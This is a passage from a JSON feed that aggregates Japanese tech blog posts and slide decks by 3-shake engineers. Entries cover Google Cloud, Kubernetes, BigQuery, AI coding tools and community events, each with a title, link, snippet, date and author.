MERGEステートメントとはhttps://cloud.google.com/bigquery/docs/reference/standard-sql/dml-syntax#merge_statementhttps://cloud.google.com/blog/ja/products/data-analytics/bigquery-explained-data-manipulation-dml別のテーブルと一致する値に基づいて以下のステートメントをまとめて実行できる機...","isoDate":"2025-08-26T10:29:31.000Z","dateMiliSeconds":1756204171000,"authorName":"seno","authorId":"seno"},{"title":"ミニマムかつ未来を見据えたGoogle Cloudアーキテクチャ","link":"https://zenn.dev/kamos/articles/poc_google_cloud","contentSnippet":"!この記事は人間が書き、AIにレビューしてもらいました はじめにAIによって開発が加速した現在、プロダクト開発においてアイデアを素早くプロダクトに落とし込み、実際に市場に展開することが重要になっています。しかしMVP(最小限の実用的製品)を立ち上げる際のクラウドインフラやアーキテクチャの選択は、その後のプロダクトの成長や運用に大きな影響を与えます。本格的な構成を最初期から採用することは立派ですが、MVPが成功するかわからないものに高コストなインフラを選択することはリスクが高いです。逆に、安易に無料枠や低コストなサービスを選択すると、将来的なスケーリングや機能追加が困難になりま...","isoDate":"2025-08-26T02:59:44.000Z","dateMiliSeconds":1756177184000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"DockerからECSへ 〜 AWSの海に出る前に知っておきたいこと 〜","link":"https://speakerdeck.com/ota1022/dockerkaraecshe-awsnohai-nichu-ruqian-nizhi-tuteokitaikoto","contentSnippet":"JAWS-UGコンテナ支部 入門編 #8 初心者大歓迎LT大会のLT登壇資料です。\\rhttps://jawsug-container.connpass.com/event/361918/","isoDate":"2025-08-21T04:00:00.000Z","dateMiliSeconds":1755748800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Gemma3 270M がでたらしいのでスペックを見てみる","link":"https://zenn.dev/satohjohn/articles/0866bbd4b2cefa","contentSnippet":"概要説明を見ている限り LLM にしてはめちゃくちゃ軽いなという印象があります（桁が違う）がそれがどういうことなのかを見てみます。 3行まとめローカル(M3 MacBook Pro のメモリ 16GB)で動かす分に関しては全く問題なく動かせる。普通のアプリケーション動かすのと大差なく周りに影響もないシンプルなユースケースに限られる。（後に検証Cloud Run GPU NVIDIA L4 1台で十分スピード感出せる (簡単な文章 200ms程度で返却できるイメージ) docker で動かすモデルが https://hub.docker.com/r/ai/gemm...","isoDate":"2025-08-17T15:17:18.000Z","dateMiliSeconds":1755443838000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google Cloud RunのDocker Compose対応","link":"https://speakerdeck.com/aminevg/google-cloud-runnodocker-composedui-ying","contentSnippet":"Google Cloud RunがDocker Composeに対応しました！。これで、既存のDockerfileを活用してCloud Runにデプロイできるようになりました。複数のコンテナをまとめて単一サービスとしてデプロイのも便利です。一方で、モノレポへの不向きだったり、複数のサービスをデプロイできなかったり、デメリットもあります。今後はTerraform対応やCompose機能の拡充を期待しています。","isoDate":"2025-08-17T04:00:00.000Z","dateMiliSeconds":1755403200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Kubernetes Admission Controlについての技術調査","link":"https://sreake.com/blog/dive-deep-into-kubernetes-admission-control/","contentSnippet":"はじめに 工学院大学工学部電気電子工学科4年の清水悠利と申します。 大学では、C言語とOpenCVを用いた画像解析アルゴリズムの研究に従事しており、それとは別に趣味でWebアプリの開発も行っています。今回Sreake事業 […]The post Kubernetes Admission Controlについての技術調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-08-12T13:32:41.000Z","dateMiliSeconds":1755005561000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（AIAgent勉強会）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-aiagentmian-qiang-hui","contentSnippet":"","isoDate":"2025-08-08T04:00:00.000Z","dateMiliSeconds":1754625600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloudサービスの生成AI関連サービス","link":"https://speakerdeck.com/shukob/google-cloudsabisunosheng-cheng-aiguan-lian-sabisu","contentSnippet":"2025年8月7日(木)、日本生成AIユーザ会 で「Google Cloudサービスの生成AI関連サービス」について発表しました。\\rhttps://genai-users.connpass.com/event/361798/","isoDate":"2025-08-07T04:00:00.000Z","dateMiliSeconds":1754539200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（GCNT2025）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-gcnt2025","contentSnippet":"","isoDate":"2025-08-05T04:00:00.000Z","dateMiliSeconds":1754366400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"BigQueryのパーティション分割テーブルでTIMESTAMPでエラーが出るときの理由","link":"https://zenn.dev/nedoko_dok0dko/articles/b6d8df76854c0a","contentSnippet":"whatBigQueryでパーティション分割テーブルを作成する際、パーティショニングを設定することができるが、TIMESTAMPを利用しようとするとエラーが出る場合がある「公式ドキュメントでは設定できると記載があるが、エラーが出るのはなぜなのか?」 これについて調べてみたログ BigQueryのパーティショニングについてhttps://cloud.google.com/bigquery/docs/partitioned-tables?hl=jaBQでパーティションテーブルを作る際に、パーティショニングを設定する。これは、公式ドキュメントでは次の型から設定することがで...","isoDate":"2025-07-31T11:40:53.000Z","dateMiliSeconds":1753962053000,"authorName":"seno","authorId":"seno"},{"title":"[KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理","link":"https://sreake.com/blog/kubecon-japan-2025-composable-disaggregated-infrastructure/","contentSnippet":"2025年度の新卒エンジニアとして株式会社3-shakeに入社いたしました、荒木と申します。私はまだまだKubernetesの初学者であり、日々の学習を通じてスキルを向上させていきたいと考えています。 そんな折、先日、K […]The post [KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T05:12:48.000Z","dateMiliSeconds":1753852368000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[KubeCon 2025 EU/JP] Kubernetes と 宇宙","link":"https://sreake.com/blog/kubecon-2025-eu-jp-kubernetes-and-universe/","contentSnippet":"はじめに 宇宙は、人類にとって長年の探求対象であり、近年は特にKubernetesをはじめとするクラウドネイティブ技術によって、そのデータ処理とコンピューティングの方法が変革され、新たなフロンティアが拓かれつつあります。 […]The post [KubeCon 2025 EU/JP] Kubernetes と 宇宙 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T02:04:28.000Z","dateMiliSeconds":1753841068000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【解説】Linux 6.11以降で発生しているリグレッションについて","link":"https://dev.mix64.com/2025/07/29/linux6-11-regressions/","contentSnippet":"今回は Linux 6.11 以降で発生しているスケジューラーのリグレッションについて解説します。執筆時点でまだ RFC状態のため、最新情報...","isoDate":"2025-07-28T15:53:01.000Z","dateMiliSeconds":1753717981000,"authorName":"ayibote","authorId":"ayibote"},{"title":"ローカルLLM入門！LM Studioをバックグラウンドで実行しObsidianと連携する","link":"https://zenn.dev/r4ynode/articles/local-llm-intro-with-obsidian","contentSnippet":"はじめに生成AI盛り上がってますね。私は置いていかれています。そんな私、奇遇なことに30コアGPUを積んだMacBookを持っているではないですか。本当は最近キラキラなAI（Devin, Claude Codeなど）を使いたいのですが、時代に逆行してローカルLLMに入門してみます。この記事では以下のことをします。LM Studioに入門Obsidianと連携LM Studio CLIを使ってバックグラウンドで実行一応、ObsidianというのはMarkdownのノートアプリです。本記事では詳しく解説しません。 デモ本記事の手順を最後まで実施すると、LM St...","isoDate":"2025-07-27T09:00:01.000Z","dateMiliSeconds":1753606801000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Go言語におけるオブジェクト指向の実装(classベースとの違い)","link":"https://zenn.dev/takehiro1111/articles/go_object_oriented","contentSnippet":"1.読者想定Goの初学者レベル(私含め)Goとclassを用いたオブジェクト指向の実装をする他言語と書き方を比較整理したい方。!思考の整理のために本記事を書いていますので、独特な表現がある場合はあまり気にしないでください。コードベースでの整理をしたいため、オブジェクト志向についての言及はしておりません。Python,TypeScriptとの比較は私自身のスキルセットの影響のため、比較する際の言語選定に深い意味はないです。\xa0 2.classで書く場合classがデータ（property）と振る舞い（method）をカプセル化し、継承によ...","isoDate":"2025-07-27T03:30:06.000Z","dateMiliSeconds":1753587006000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"転職したらAWS MCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaraaws-mcpsabadatutajian","contentSnippet":"「 転職したらMCPサーバーだった件」というタイトルで登壇したことがある。本日は「JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ」というなんとなく強そうなイベントで登壇しました。\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ\\r- 公式URL: https://jawsug-sre.connpass.com/event/358781/\\r- ハッシュタグ: https://x.com/search?q=%23jawsug_sre&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","isoDate":"2025-07-23T04:00:00.000Z","dateMiliSeconds":1753243200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました","link":"https://sreake.com/blog/2025-summer-workshop-report/","contentSnippet":"はじめに 2025年7月3日（木）・4日（金）の2日間、株式会社スリーシェイクの夏ワークショップを開催しました。今回は13名の学生の皆さんにご参加いただき、クラウドネイティブ技術の世界を体験していただきました。 \uD83D\uDCF8 ワー […]The post 【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T23:00:00.000Z","dateMiliSeconds":1753138800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる","link":"https://sreake.com/blog/vertex-ai-agent-builder-with-agent-development-kit-and-agent-engine/","contentSnippet":"1. 概要 本記事では、Googleが提供するAgent Development Kit (ADK) とAgent Engineを利用して、AIエージェントの構築方法を紹介しつつ、Vertex AI Agent Buil […]The post Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T22:00:00.000Z","dateMiliSeconds":1753135200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"技術イベントのメモはOpenAI WhisperとGemini CLIに任せる","link":"https://zenn.dev/r4ynode/articles/audio-transcription-using-openai-whisper","contentSnippet":"イベントの内容覚えてますか？イベントに参加しても内容を覚えていることって少なくないですか？イベントに参加しただけで満足して、特に生産的な活動に活かすことなく終わってしまうことがあると思います。また、登壇者の話を必死にメモしようとして、肝心な内容を聞き逃してしまうこともよくあります。イベント参加は、個人的には学習のモチベーションアップに繋がるので良いのですが、せっかくなら学んだ内容をしっかり定着させたいと思いました。そこで、YouTubeや現地の音声を文字起こしして振り返りたいと考えたものの、理想的なツールが見つからなかったので自分で作ってみることにしました。この記事では、Op...","isoDate":"2025-07-21T00:00:01.000Z","dateMiliSeconds":1753056001000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Analytics Development Lifecycle（ADLC）について","link":"https://zenn.dev/nedoko_dok0dko/articles/19d54d6c57cd93","contentSnippet":"whatdbt Labsが提唱する「Analytics Development Lifecycle(ADLC)」について調べてみたことやわかったことの個人ログ!⚠️ 元記事が英語であり、それを翻訳&個人的意訳しているので少々文章が読みにくくなっているかもしれません Analytics Development Lifecycle（ADLC）とは？※ 日本語にすると「開発分析ライフサイクル」となる?https://www.getdbt.com/resources/the-analytics-development-lifecycle組織がデータ分析をより良く...","isoDate":"2025-07-18T10:59:32.000Z","dateMiliSeconds":1752836372000,"authorName":"seno","authorId":"seno"},{"title":"SRE NEXT 2025 資料一覧","link":"https://zenn.dev/r4ynode/articles/srenext2025-documents","contentSnippet":"本記事についてSRE NEXT 2025に参加しました。自分で後で振り返る用に、公開されている発表資料を視認範囲の中で集めました。とりあえずタイトルをすべて羅列しているので、見つけられていないものに関しては空白になっています。新しく資料が公開、発見されたら追記します。 記載順スケジュール時間に沿って記載しています。https://sre-next.dev/2025/schedule/ DAY 1: 7/11 - 資料一覧 Fast by Friday: Making performance analysis fast and easy資料は見つけられませんでした...","isoDate":"2025-07-11T18:00:00.000Z","dateMiliSeconds":1752256800000,"authorName":"Reito Koike","authorId":"reito"},{"title":"AI時代でもソフトウェア設計の重要性は変わらない(視聴レポ)","link":"https://zenn.dev/r4ynode/articles/event-report-ai-era-domain-design","contentSnippet":"はじめに先日、以下のオンラインイベントを視聴しました。本記事では、イベント内容を踏まえた個人的な学びや気づきを簡単にまとめます。単なる内容の羅列ではなく、自分の言葉で振り返ります。https://forkwell.connpass.com/event/356295/!イベントの注意事項に則り記事を執筆していますが、内容に問題がある場合は速やかに修正・削除いたします。 イベント資料登壇者の方々が公開されているイベント資料はこちらです。https://speakerdeck.com/minodriven/ai-good-code-bad-codehttps://spe...","isoDate":"2025-07-11T01:00:06.000Z","dateMiliSeconds":1752195606000,"authorName":"Reito Koike","authorId":"reito"},{"title":"mypy: type checker for python","link":"https://daisuke1024akagawa.medium.com/mypy-type-checker-for-python-0cafa6124ad6?source=rss-c54ac439ad2b------2","isoDate":"2025-07-09T12:51:38.000Z","dateMiliSeconds":1752065498000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"スリーシェイク、NVIDIA Inception に参加","link":"https://sreake.com/blog/nvidia-inception/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、テクノロジーの進歩によって業界に革命を起こすスタートアップ企業を育成するプログラムであるNVIDIA Inceptionに参加しました。The post スリーシェイク、NVIDIA Inception に参加 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-07T10:29:15.000Z","dateMiliSeconds":1751884155000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Obsidian上でGeminiを使う理想環境の探求","link":"https://zenn.dev/r4ynode/articles/obsidian-how-to-use-geminicli","contentSnippet":"はじめにObsidianとGemini CLIを組み合わせた知的生産の効率化手法が注目されています。プロジェクト専用のGEMINI.mdを作成してVault直下に配置し、Gemini CLIを起動することで、ノート作成や情報整理のワークフローを大幅に改善できるというものです。しかし、Obsidianでノートを書きながら別途ターミナルを開いてアプリを行き来するやり方は、思考の流れを分断しがちです。現状のObsidianのAI機能は発展途上であり、多くのユーザーがCursorやGemini CLIなどの外部ツールを併用しているのが実情でしょう。理想的なのは、ノート作成や情報整理の...","isoDate":"2025-07-06T09:00:02.000Z","dateMiliSeconds":1751792402000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ローカルエディタからワンクリックでGoogle Cloud Workstationに接続する方法","link":"https://qiita.com/aminevg/items/27f55b1809b6629567f6","contentSnippet":"背景皆さんは、Google Cloud Workstationsという製品はご存知ですか？「フルマネージド開発環境」を提供していて、セキュリティの強化や開発者のオンボーディングの加速を期待できる製品です。クラウド上の開発環境ということもあって、ブラウザ内での開...","isoDate":"2025-07-02T13:43:33.000Z","dateMiliSeconds":1751463813000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Obsidianを導入すべきかを本気で考える","link":"https://zenn.dev/r4ynode/articles/obsidian-vs-other-note-apps","contentSnippet":"はじめに巷でObsidianというMarkdownエディタが流行っていますね。Obsidianと生成AIを組み合わせた使い方で注目を浴びています。流行りに乗っかってObsidianを導入してみましたが、ノート同士をリンクさせて何が良いのか全く理解できませんでした。調べると、ObsidianとはZettelkastenというノート術を実践できるアプリケーションのようです。ここで、Obsidianについての説明を公式ページから抜粋します。個人的なメモから日記、ナレッジベース、プロジェクト管理まで、Obsidianはアイデアを考案して整理するためのツールを提供します。リンク：...","isoDate":"2025-07-02T02:50:58.000Z","dateMiliSeconds":1751424658000,"authorName":"Reito Koike","authorId":"reito"},{"title":"「あつまれ Lookerの森 #3」 オンサイト行ってきました記録","link":"https://zenn.dev/nedoko_dok0dko/articles/5da95def70336b","contentSnippet":"what6/27に開催された「あつまれ Lookerの森 #3」のオンサイト参加ログです当日の雰囲気や登壇者の方々の発表内容等を簡単にまとめたものになります あつまれ Lookerの森とはJagu\'e\'rのデータ利活用分科会が主催するLookerにフォーカスを当てた勉強会です※ Jagu\'e\'r: Google Cloudのユーザー会。Lookerだけでなく様々なGoogle Cloud製品に関したコミュニティやイベントを企画・開催しています今回は3回目ということでしたが、私は初めての参加でした。コミュニティイベントというのも初参加だったため、「どんな雰囲気なのだ...","isoDate":"2025-06-30T11:21:02.000Z","dateMiliSeconds":1751282462000,"authorName":"seno","authorId":"seno"},{"title":"Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする","link":"https://sreake.com/blog/gemini-code-assist-prisma-review/","contentSnippet":"一般的にデータベースの変更はアプリケーションの変更に比べると影響が大きく、慎重な対応が求められます。またcreatedAtのデフォルト値など、実行タイミングにより値が変動する設定をし忘れた場合、元の値を復元することは困難 […]The post Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-30T06:59:22.000Z","dateMiliSeconds":1751266762000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク所属のエンジニアが「2025 Japan All AWS Certifications Engineers」に選出","link":"https://sreake.com/blog/2025-japan-all-aws-certifications-engineers/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、スリーシェイク所属のエンジニア鈴木 勝史が、「2025 Japan All AWS Certifications Engineers」に選出されたことをお知らせします。The post スリーシェイク所属のエンジニアが「2025 Japan All AWS Certifications Engineers」に選出 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-30T01:00:00.000Z","dateMiliSeconds":1751245200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"生成AIで小説を書くためにプロンプトの制約や原則について学ぶ / prompt-engineering-for-ai-fiction ","link":"https://speakerdeck.com/nwiizo/prompt-engineering-for-ai-fiction","contentSnippet":"諸君、聞かれよ。本日、私は「女オタ生成AIハッカソン2025夏東京」なる前代未聞の催しにて、生まれて初めて登壇することと相成った。かつての私は純朴なプログラマーであり、「変数名を30分悩んだ挙句、結局tmpにする」という、実に平凡な悩みを抱える程度の技術者であったのだ。\\r\\r歳月は容赦なく流れ、今や私はプロンプトエンジニアリングという名の魔境に足を踏み入れた哀れな求道者となり果てた。昨夜も丑三つ時まで、私は薄暗い書斎でディスプレイの冷たき光に照らされながら、「なぜ生成AIは『簡潔に』と百回唱えても、源氏物語の長文を生成するのか」という哲学的難題と格闘していたのである。\\r\\r30分という持ち時間に対し50枚のスライドを用意するという、まるで賽の河原で石を積む如き徒労に及んでいる。そのうち半分は「プロンプトという名の現代呪術における失敗例集」と題した、私の苦悩の結晶である。ああ、AIとの対話とは、かくも人間の正気を奪うものなのか。\\r\\r---\\r\\rブログも書いた。\\r生成AIで物語を書くためにプロンプトの制約や原則について学ぶ、という話をしてきました #女オタ生成AI部\\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/30/171149","isoDate":"2025-06-29T04:00:00.000Z","dateMiliSeconds":1751169600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Snowflakeで始めるリージョン間データ共有","link":"https://sreake.com/blog/inter-region-data-sharing-with-snowflake/","contentSnippet":"はじめに 組織内のSnowflakeアカウント同士で安全にリージョン間データ共有をするなら、LIST機能のOrganizational listingsを使うのが非常におすすめです。 この記事ではSnowflakeがサポ […]The post Snowflakeで始めるリージョン間データ共有 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T10:08:28.000Z","dateMiliSeconds":1751018908000,"authorName":"Sreake","authorId":"Sreake"},{"title":"論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』","link":"https://sreake.com/blog/commercial-llm-agents-are-already-vulnerable-to-simple-yet-dangerous-attacks/","contentSnippet":"今回は、LLMエージェントシステムの脆弱性に関して述べられている論文の紹介をさせていただきます。3-shakeではさまざまな勉強会が開かれており、今回紹介する論文も勉強会で取り上げた題材となっています。エージェントシステ […]The post 論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T07:55:50.000Z","dateMiliSeconds":1751010950000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraformを使ってVPC内のCloud Runサービス間で通信させる","link":"https://qiita.com/aminevg/items/4912c95b795c6739d703","contentSnippet":"背景Cloud Runはサーバーレスでコンテナを動かせる便利なサービスですが、複数のサービスを連携させようとすると、ネットワーク構成で悩むことがあります。例えば、フロントエンドは一般公開し、バックエンドは内部ネットワークからのみアクセス可能にしたい場合VPC内の...","isoDate":"2025-06-27T07:26:55.000Z","dateMiliSeconds":1751009215000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境","link":"https://sreake.com/blog/safe-universal-dev-env-with-devcontainer-mise/","contentSnippet":"はじめに：生成 AI 時代の新たな悩み 「ChatGPT、このバグを直して！」 「GitHub Copilot、この機能を実装して！」 そんなふうに生成 AI に頼んでコードを書いてもらったら、気づいたら開発環境がぐちゃ […]The post AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-26T13:16:14.000Z","dateMiliSeconds":1750943774000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gemini cli が出たっぽいので cloud run deploy までやってみるぞ","link":"https://zenn.dev/satohjohn/articles/4d205e445714cf","contentSnippet":"概要Gemini cli ってのが出ました。https://github.com/google-gemini/gemini-cli基本的には Gemini code assist をローカルでも使えるようなイメージを感じています。（間違ってたらすいません)https://blog.google/technology/developers/introducing-gemini-cli-open-source-ai-agent/30分程度とりま調べた限りでまとめます。無料という言葉に人間は弱いのだよ。 表題の通りやってみる。とりま npm -g でインストールしたら ge...","isoDate":"2025-06-25T16:15:27.000Z","dateMiliSeconds":1750868127000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google CloudのPDEの更新がきたので受けてきましたよという話","link":"https://zenn.dev/nedoko_dok0dko/articles/74f196e3a1a84f","contentSnippet":"whatGoogle Cloud認定資格のProfessional Data Engineerの更新?が迫っていたので受験してきました記録2年ぶりの試験なので、当時との問題の違いとか個人的な所感とか…を簡単に受験結果は合格でした! Professional Data Engineerについてhttps://cloud.google.com/learn/certification/data-engineer?hl=jaGoogle Cloudの認定資格の一つGoogle Cloud製品におけるデータエンジニア領域の専門知識やスキルを問う試験【例】データ分析...","isoDate":"2025-06-24T10:43:47.000Z","dateMiliSeconds":1750761827000,"authorName":"seno","authorId":"seno"},{"title":"openhands cli で Gemini 2.5-flash を使って Cloud Run でアプリケーションをデプロイする","link":"https://zenn.dev/satohjohn/articles/720102a717eb1a","contentSnippet":"概要タイトルの通りのことをやってみるという企画です。claude code ってみんないうからうーんどうしよう、会社で使ってもらいたいけど Gemini 使いたいなーっていうのを見てたら openhands っていうのがあって、それの cli が良さそうということで、触ろうというモチベーション アプリケーションを作ってもらうとりま動かすだけをやってみますhttps://docs.all-hands.dev/usage/how-to/cli-modeflash でやっているのはめっちゃお金かかったらどうしようという気持ちからです。export CLOUDSDK_ACTI...","isoDate":"2025-06-20T16:06:04.000Z","dateMiliSeconds":1750435564000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"MultiKueueを利用した外部クラスタへのジョブスケジューリング","link":"https://sreake.com/blog/multikueue-job-scheduling-to-external-cluster/","contentSnippet":"この記事の情報は2025年5月時点(v0.11.4)での情報をもとに作成しています。 Kueueのベータに昇格した機能の一つであり、外部クラスタへのスケジューリング機能として注目されるMultiKueueについて解説しま […]The post MultiKueueを利用した外部クラスタへのジョブスケジューリング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-19T04:15:27.000Z","dateMiliSeconds":1750306527000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-06-20 PrivateLinkがNLBなしで作れるようになり便利になった","link":"https://speakerdeck.com/masasuzu/2025-06-20-privatelinkkanlbnasitezuo-reruyouninaribian-li-ninatuta","contentSnippet":"","isoDate":"2025-06-19T04:00:00.000Z","dateMiliSeconds":1750305600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Claude Code どこまでも/ Claude Code Everywhere","link":"https://speakerdeck.com/nwiizo/claude-everywhere","contentSnippet":"僕がClaude Codeに初めて触れたのは、2025年の春だった。生成AIにはすでに慣れ親しんでいた。流行に乗り遅れてはいけないと必死に勉強し、エディターの補完機能やコード生成ツールとして日常的に活用していた。ただ、当時の僕にとってそれはまだ「CLIで動く便利なコーディング支援ツール」程度の認識でしかなかった。「AIが90%のコードを自動生成」という謳い文句を見ても、半信半疑でターミナルを開いたのを覚えている。\\r\\rイベント名:【オフライン開催】KAGのLT会 #6 〜御社のエンジニア育成どうしてる!? スペシャル〜\\r公式URL: https://kddi-agile.connpass.com/event/357862/\\r\\r「実装」から「設計」へのパラダイムシフト というより無限に体力が必要という話をした \\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/19/102529\\r\\r【参考文献】\\r  - 公式ドキュメント\\r    - Claude Code 公式サイト https://www.anthropic.com/claude-code\\r    - Claude Code ドキュメント https://docs.anthropic.com/en/docs/claude-code/overview\\r    - Claude Code Best Practices https://www.anthropic.com/engineering/claude-code-best-practices\\r    - 抽象化をするということ - 具体と抽象の往復を身につける https://speakerdeck.com/soudai/abstraction-and-concretization\\r    - How I Use Claude Code https://spiess.dev/blog/how-i-use-claude-code\\r    - LLMの制約を味方にする開発術 https://zenn.dev/hidenorigoto/articles/38b22a2ccbeac6\\r    - Claude Code版Orchestratorで複雑なタスクをステップ実行する https://zenn.dev/mizchi/articles/claude-code-orchestrator\\r    - Agentic Coding Recommendations https://lucumr.pocoo.org/2025/6/12/agentic-coding/\\r    - Claude Codeに保守しやすいコードを書いてもらうための事前準備 https://www.memory-lovers.blog/entry/2025/06/12/074355\\r    - Claude Codeによる技術的特異点を見届けろ https://zenn.dev/mizchi/articles/claude-code-singularity-point","isoDate":"2025-06-18T04:00:00.000Z","dateMiliSeconds":1750219200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SRE支援から見えてきたSREの核","link":"https://speakerdeck.com/kojake_300/srezhi-yuan-karajian-etekitasrenohe","contentSnippet":"","isoDate":"2025-06-12T04:00:00.000Z","dateMiliSeconds":1749700800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Open Policy Containers(OPC)","link":"https://zenn.dev/tayusa/articles/2ade4dd1928937","contentSnippet":"Open Policy Containers(OPC)の前にOpen Policy Agent(OPA)https://www.openpolicyagent.org/クラウドネイティブ環境におけるポリシー適用のための汎用エンジンRegoという宣言型言語を用いてポリシーを記述するJSONやYAMLのような構造化されたデータを入力として受け取り、ポリシー評価の結果（許可/拒否など）を返す例: 全てのNamespaceに管理者を特定するためのownerラベルを必須にするpackage maindeny contains msg if {    # 対象リソース...","isoDate":"2025-06-12T02:27:15.000Z","dateMiliSeconds":1749695235000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"「セキュリティ・キャンプ 2025 全国大会」にスリーシェイク所属のエンジニアが講師として登壇","link":"https://sreake.com/blog/security-camp-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に所属のエンジニア水元 恭平が、「セキュリティ・キャンプ 2025 全国大会」に講師として登壇することをお知らせいたします。The post 「セキュリティ・キャンプ 2025 全国大会」にスリーシェイク所属のエンジニアが講師として登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-09T01:00:00.000Z","dateMiliSeconds":1749430800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～","link":"https://sreake.com/blog/oracle-database-google-cloud-japan-launch/","contentSnippet":"2025年4月のGoogle Cloud Nextでの発表から2か月、ついにOracle Database＠Google CloudがTokoy・Osakaリージョンで利用可能になりました。 Oracle Databas […]The post Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-06T10:48:27.000Z","dateMiliSeconds":1749206907000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク所属のエンジニアが「AWS Community Builders」に選出","link":"https://sreake.com/blog/aws-community-builders-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に所属の鈴木 勝史が、「AWS Community Builders」に2年連続で選出されたことをお知らせします。The post スリーシェイク所属のエンジニアが「AWS Community Builders」に選出 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-02T01:00:00.000Z","dateMiliSeconds":1748826000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GoogleのAI Agent","link":"https://speakerdeck.com/shukob/googlenoai-agent","contentSnippet":"2025年5月30日(金) AI Agent 勉強会 Vol.3 にて、\\rGoogle CloudのAI Agentサービスと\\rGoogle I/O 2025 で発表された内容の概要を紹介させていただきました。\\rhttps://almondo.connpass.com/event/355297/","isoDate":"2025-05-30T04:00:00.000Z","dateMiliSeconds":1748577600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、「KubeCon + CloudNativeCon Japan 